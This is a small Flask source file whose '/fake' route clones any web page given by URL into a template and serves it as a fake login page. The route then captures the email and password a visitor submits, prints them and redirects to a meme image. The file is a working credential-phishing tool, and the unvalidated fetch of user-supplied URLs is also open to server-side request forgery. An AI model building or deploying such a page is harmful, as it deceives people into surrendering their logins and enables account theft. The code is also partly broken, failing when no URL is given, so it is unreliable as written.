from app import app
from flask import render_template, request, redirect
import sys, requests, os



@app.route('/fake', methods=["GET","POST"])
def fake_login():
	if request.method == 'POST':
		email = request.form['email']
		password = request.form['password'] 
		print(email, password)
		return redirect("http://s.quickmeme.com/img/6d/6d78dde4cac0310b96938e2ee0696c3ba9410e5de679cbdc1d9967bce8fe4366.jpg")

	if request.args.get("url"):
		url = request.args.get("url")
		r = requests.get(url)
		hstring = str(r.text)
		name = "fake.html"
		file_name = os.path.join("app", "templates", name)
		
		with open(file_name, 'w') as out:
			out.write(hstring)
	
	return render_template(name)

